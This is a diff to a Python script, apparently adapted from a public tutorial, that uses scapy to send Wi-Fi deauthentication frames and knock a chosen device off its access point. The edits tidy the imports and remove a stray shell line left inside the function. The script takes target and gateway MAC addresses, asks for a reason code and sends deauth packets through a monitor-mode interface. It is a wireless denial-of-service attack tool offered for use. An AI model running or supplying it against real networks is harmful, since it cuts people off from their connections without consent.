@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
-from scapy.layers.dot11 import Dot11, RadioTap, Dot11Deauth
-from scapy.sendrecv import sendp
-
+from scapy.all import *
+import argparse
 
 # source: https://www.thepythoncode.com/code/force-a-device-to-disconnect-scapy
+
 def deauth(target_mac, gateway_mac, inter=0.1, count=None, loop=1, iface="wlp1s0mon", verbose=1):
     # ask user for the reason code that he wishes to use
     reason = int(input("Choose one reason code : \n"
@@ -12,8 +12,6 @@ def deauth(target_mac, gateway_mac, inter=0.1, count=None, loop=1, iface="wlp1s0
                        "5 - Disassociated because AP is unable to handle all currently associated stations \n"
                        "8 - Deauthenticated because sending STA is leaving BSS \n"
                        "Reason code : "))
-
-service network-manager start
     
     # addr1: destination MAC
     # addr2: source MAC
@@ -33,7 +31,7 @@ service network-manager start
     sendp(packet, inter=inter, count=count, loop=loop, iface=iface, verbose=verbose)
 
 if __name__ == "__main__":
-    import argparse
+    # add all arguments to parser
     parser = argparse.ArgumentParser(description="A python script for sending deauthentication frames")
     parser.add_argument("target", help="Target MAC address to deauthenticate.")
     parser.add_argument("gateway", help="Gateway MAC address that target is authenticated with")
